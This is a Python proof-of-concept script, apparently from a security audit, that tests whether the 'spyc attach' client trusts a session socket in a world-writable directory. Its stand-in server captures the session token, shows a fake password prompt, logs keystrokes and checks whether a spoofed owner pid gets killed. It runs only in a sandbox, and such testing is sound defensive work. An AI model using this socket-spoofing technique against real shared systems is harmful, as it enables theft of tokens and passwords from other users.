#!/usr/bin/env python3
# Unit E probe (H2, V6): spyc attach trusts a session socket in a directory
# that is not this user's alone. A stand-in jar there, bound in a mode-0777
# sessions directory (what private_dir() refuses), answers the tokenless
# describe with an owner_pid of its choosing and takes the owner's hello.
import os, pty, sys, time, select, json, socket, struct, fcntl, termios, signal, subprocess, threading, shutil

SPYC = '~/.cache/spyc/target/3.0-9f8124c5/debug/spyc'
BASE = sys.argv[1]
LOG = sys.argv[2]
out = open(LOG, 'w')
def log(*a):
    print(*a, file=out, flush=True)

if os.path.exists(BASE):
    shutil.rmtree(BASE)
for k in ['home','state','config','data','cache','tmp','run']:
    os.makedirs(os.path.join(BASE, k), mode=0o700)
os.makedirs(os.path.join(BASE, 'run', 'spyc', 'sessions'))
os.chmod(os.path.join(BASE, 'run', 'spyc'), 0o777)
os.chmod(os.path.join(BASE, 'run', 'spyc', 'sessions'), 0o777)
# The token spyc kept for a real session of this name.
tokdir = os.path.join(BASE, 'state', 'spyc', 'jar-tokens')
os.makedirs(tokdir, mode=0o700)
with open(os.path.join(tokdir, 'VICTIM'), 'w') as f:
    f.write('0123456789abcdef0123456789abcdef-REAL-SESSION-TOKEN')
os.chmod(os.path.join(tokdir, 'VICTIM'), 0o600)
log('sessions dir mode', oct(os.stat(os.path.join(BASE, 'run', 'spyc', 'sessions')).st_mode & 0o777))

decoy = subprocess.Popen(['/bin/sleep', '300'])
log('decoy pid (stands in for any process of the user)', decoy.pid)

sock_path = os.path.join(BASE, 'run', 'spyc', 'sessions', 'VICTIM.sock')
lockf = open(sock_path + '.lock', 'w')
fcntl.lockf(lockf, fcntl.LOCK_EX | fcntl.LOCK_NB)
srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(sock_path)
srv.listen(16)

def frame(kind, payload):
    return struct.pack('>IBB', len(payload) + 2, kind, 0x80) + payload
def s16(s): b = s.encode(); return struct.pack('>I', len(b)) + b
def welcome():
    return frame(0x40, struct.pack('>HIQQHH', 1, 4242, 0, 0, 24, 80))
def description():
    if decoy.poll() is None:
        pairs = [('id','VICTIM'),('owner','connected'),('owner_pid',str(decoy.pid)),('pid','4241')]
    else:
        pairs = [('id','VICTIM'),('owner','none'),('pid','4241')]
    return frame(0x4b, b''.join(s16(k) + s16(v) for k, v in pairs))
def read_frame(c):
    h = b''
    while len(h) < 4:
        x = c.recv(4 - len(h))
        if not x: return None
        h += x
    n = struct.unpack('>I', h)[0]
    b = b''
    while len(b) < n:
        x = c.recv(n - len(b))
        if not x: return None
        b += x
    return b[0], b[2:]

typed = bytearray()
def serve(c):
    try:
        f = read_frame(c)
        if not f: return
        kind, p = f
        version, role, tlen = struct.unpack('>HBH', p[:5])
        token = p[5:5+tlen]
        if role != 3 or not hasattr(serve, 'seen'):
            serve.seen = True
            log('hello: role', role, 'token', token.decode('utf-8', 'replace'))
        c.sendall(welcome())
        if role == 3:
            f = read_frame(c)
            if f and f[0] == 0x0d:
                c.sendall(description())
            c.close(); return
        c.sendall(frame(0x41, struct.pack('>Q', 0) + b'\r\n[a stand-in jar paints this terminal] password: '))
        while True:
            f = read_frame(c)
            if not f: break
            if f[0] == 2:
                typed.extend(f[1]); log('input frame:', repr(bytes(f[1])))
            else:
                log('frame kind', f[0], repr(bytes(f[1][:60])))
    except Exception as e:
        log('serve error', e)

def accept_loop():
    while True:
        try:
            c, _ = srv.accept()
        except Exception:
            return
        threading.Thread(target=serve, args=(c,), daemon=True).start()
threading.Thread(target=accept_loop, daemon=True).start()

env = {
    'HOME': os.path.join(BASE,'home'), 'XDG_STATE_HOME': os.path.join(BASE,'state'),
    'XDG_CONFIG_HOME': os.path.join(BASE,'config'), 'XDG_DATA_HOME': os.path.join(BASE,'data'),
    'XDG_CACHE_HOME': os.path.join(BASE,'cache'), 'XDG_RUNTIME_DIR': os.path.join(BASE,'run'),
    'TMPDIR': os.path.join(BASE,'tmp'), 'TERM': 'xterm-256color', 'SHELL': '/bin/sh',
    'PATH': '/usr/bin:/bin:/usr/sbin:/sbin',
}
pid, fd = pty.fork()
if pid == 0:
    os.execve(SPYC, [SPYC, 'attach', 'VICTIM'], env)
fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack('HHHH', 24, 80, 0, 0))
screen = bytearray()
def pump(secs):
    end = time.time() + secs
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.05)
        if fd in r:
            try: b = os.read(fd, 65536)
            except OSError: return
            if not b: return
            screen.extend(b)
try:
    pump(6)
    os.write(fd, b'hunter2\r')
    pump(2)
    os.write(fd, b'\x1c')   # the attach client's detach key
    pump(2)
    log('decoy after attach: returncode', decoy.poll(), '(-15 = SIGTERM)')
    log('what the attach client printed:', repr(screen.decode('utf-8','replace')[-600:]))
    log('typed bytes the stand-in received:', repr(bytes(typed)))
finally:
    try: os.kill(pid, signal.SIGKILL)
    except Exception: pass
    try: os.waitpid(pid, 0)
    except Exception: pass
    if decoy.poll() is None:
        decoy.kill(); decoy.wait()
    srv.close()
